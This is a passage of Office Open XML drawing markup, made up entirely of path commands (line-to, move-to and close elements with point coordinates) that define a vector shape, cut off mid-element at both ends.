                  <a:lnTo>
                    <a:pt x="8620" y="8510"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8767" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9061" y="9060"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9207" y="9207"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="9354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9758" y="9574"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10638" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11482" y="10784"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12289" y="11408"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12362" y="11445"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12472" y="11445"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12545" y="11408"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12582" y="11371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12619" y="11298"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12655" y="11188"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12619" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12545" y="11041"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11775" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11812" y="10381"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11922" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11995" y="10014"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11995" y="9941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11958" y="9904"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11885" y="9904"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11738" y="10051"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11592" y="10234"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11555" y="10271"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11005" y="9867"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10821" y="9757"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10858" y="9684"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10895" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11041" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11078" y="9427"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11078" y="9354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11078" y="9317"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11005" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10968" y="9317"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10895" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10821" y="9317"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10711" y="9427"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10601" y="9574"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10124" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10051" y="9207"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10234" y="8914"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10234" y="8840"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10234" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="8730"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10088" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10051" y="8730"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10014" y="8767"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9758" y="9060"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9537" y="8877"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9354" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9134" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9207" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="8217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9354" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9354" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9317" y="7850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9244" y="7850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9171" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8987" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8951" y="8180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8767" y="8033"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8327" y="7740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8364" y="7446"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8364" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8327" y="7336"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8290" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8180" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8107" y="7336"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8070" y="7446"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8034" y="7556"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7960" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7410" y="7116"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7447" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7520" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7520" y="6896"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7520" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7557" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7520" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7483" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7410" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7337" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7116" y="6896"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="6639"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="6603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7116" y="6163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7557" y="5649"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7593" y="5722"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7630" y="5759"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7740" y="5759"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8034" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8327" y="5392"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8620" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="5025"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9244" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9574" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9941" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="4622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10491" y="4622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10675" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10821" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10931" y="4842"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11041" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11078" y="5136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11151" y="5502"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11151" y="5906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11151" y="6309"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11151" y="6676"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11188" y="7006"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11261" y="7373"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11445" y="7703"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11408" y="7813"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11372" y="7923"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11372" y="8033"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11372" y="8143"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11445" y="8253"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11482" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11592" y="8400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11665" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11775" y="8510"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12105" y="8510"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12435" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12765" y="8840"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13022" y="8877"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13316" y="8877"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13646" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13939" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14233" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14489" y="8400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14746" y="8217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14930" y="8033"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14966" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14966" y="7923"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14930" y="7813"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14820" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14710" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14123" y="8143"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13829" y="8290"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13462" y="8400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13206" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12912" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12692" y="8363"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12472" y="8217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12545" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12582" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12582" y="7850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12545" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12509" y="7740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12325" y="7630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12142" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11812" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11628" y="7116"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11518" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11518" y="6346"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11518" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11555" y="5649"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11518" y="5282"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11445" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11335" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11188" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11005" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10785" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10565" y="4255"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10051" y="4255"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9758" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9464" y="4365"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="4585"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8400" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7960" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8290" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9061" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9464" y="3191"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9831" y="2641"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9868" y="2568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9868" y="2531"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9794" y="2421"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="2384"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9684" y="2348"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="15663" y="9867"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="15700" y="9904"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15627" y="10381"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15663" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15663" y="10454"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15773" y="10491"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15443" y="10895"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15443" y="10821"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15333" y="10491"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15296" y="10454"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15260" y="10454"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15223" y="10491"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15223" y="10528"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15186" y="10821"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15186" y="11188"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15223" y="11225"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14746" y="11848"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14746" y="11591"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14746" y="11371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14746" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14710" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15333" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15663" y="9867"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="14526" y="11298"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="14453" y="11555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14416" y="11775"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14453" y="11885"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14489" y="11958"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14563" y="11995"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14600" y="11995"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14123" y="12619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14049" y="12655"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14049" y="12362"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14049" y="12142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14049" y="12032"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14013" y="11922"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14526" y="11298"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="4806" y="7997"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4769" y="8033"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="8070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4952" y="8217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5099" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6126" y="8840"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7116" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7557" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8437" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9244" y="11371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10088" y="12105"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10344" y="12325"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10748" y="12655"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10931" y="12765"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="12839"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11225" y="12839"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11298" y="12802"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11335" y="12765"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11372" y="12692"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11372" y="12582"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11335" y="12472"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11151" y="12325"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10711" y="11995"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10271" y="11628"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8547" y="10051"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8107" y="9684"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7703" y="9354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="9024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6786" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6309" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5833" y="8217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="8033"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="7997"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="954" y="12582"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1101" y="12692"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1064" y="12765"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1064" y="12839"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1064" y="12875"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="12839"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1211" y="12912"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1247" y="12985"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1247" y="13059"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1284" y="13242"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="991" y="13095"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="844" y="13059"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="697" y="13022"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="844" y="12765"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="954" y="12582"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="2715" y="10858"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="2641" y="10931"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2641" y="10968"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2788" y="11151"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2935" y="11261"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3302" y="11445"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3778" y="11775"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4255" y="12105"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5099" y="12765"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5539" y="13095"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5759" y="13242"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5869" y="13279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6053" y="13279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6126" y="13242"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="13169"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6126" y="13059"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6089" y="12985"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6016" y="12875"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5869" y="12729"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5502" y="12472"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4512" y="11738"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4035" y="11408"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3338" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3118" y="10895"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2935" y="10858"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="13756" y="12252"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="13719" y="12362"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13719" y="12619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13719" y="12912"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13756" y="12985"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13793" y="13022"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13719" y="13095"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13389" y="13536"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13426" y="13132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13462" y="12912"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13462" y="12765"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13426" y="12655"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13756" y="12252"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="4402" y="8694"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4329" y="8730"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4255" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4255" y="8877"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4255" y="8987"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4292" y="9060"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4365" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4512" y="9207"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4842" y="9354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5136" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5392" y="9647"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5869" y="10014"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6346" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6786" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8584" y="12398"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9501" y="13169"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="13315"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9941" y="13462"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10161" y="13572"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10271" y="13609"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10381" y="13609"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10454" y="13572"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10491" y="13536"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10528" y="13462"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10491" y="13389"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10418" y="13242"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10271" y="13132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9978" y="12949"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9537" y="12619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9134" y="12288"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7557" y="10931"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6823" y="10271"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6089" y="9647"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5686" y="9354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="9097"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="8950"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4549" y="8840"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4475" y="8767"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="8694"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="1541" y="13022"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="2091" y="13389"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2091" y="13572"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2126" y="13749"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1504" y="13389"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1578" y="13352"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1614" y="13315"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1614" y="13279"/>
                  </a:lnTo>
                  <a:lnTo>
